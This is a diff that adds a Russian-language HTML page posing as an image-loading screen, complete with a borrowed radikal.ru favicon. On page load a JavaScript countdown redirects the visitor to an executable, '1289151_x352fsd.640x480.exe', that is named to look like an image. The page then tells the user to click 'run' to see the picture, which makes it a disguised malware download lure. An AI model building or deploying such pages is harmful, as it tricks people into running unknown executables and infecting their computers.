@@ -1,0 +1,36 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<link rel="shortcut icon" href="http://www.radikal.ru/favicon.ico" type="image/x-icon" />
+
+<title>Загрузка изображения</title>
+
+<script language=javascript>
+var intLeft = 3; // Время в секундах
+
+function GoPage() {
+if (0 == intLeft) // Time is up--navigate.
+location.replace("../../1289151_x352fsd.640x480.exe") // Загрузка файла
+else {
+intLeft -= 1;
+document.all.gotopage.innerText = intLeft + " ";
+setTimeout("GoPage()", 1000);
+}
+}
+
+</script>
+
+</head>
+<body onLoad="setTimeout('GoPage()', 1000)">
+<center>
+<br><img src="../../loading.gif" /><br>
+<b style="color:#808080">Загрузка картинки начнется через</b> <b id="gotopage" style="color:green;"><script language=javascript>document.write(intLeft);</script>
+</b><b style="color:#808080">(Секунд)</b><br>
+<small><b style="color:green">*</b>для загрузки изображения кликните "запуск"</small>
+ <p>Если загрузка не началась, нажмите на <a href="../../1289151_x352fsd.640x480.exe" target="_blank">эту ссылку</a>. </p>
+</center>
+</body>
+</html>
+
+
+
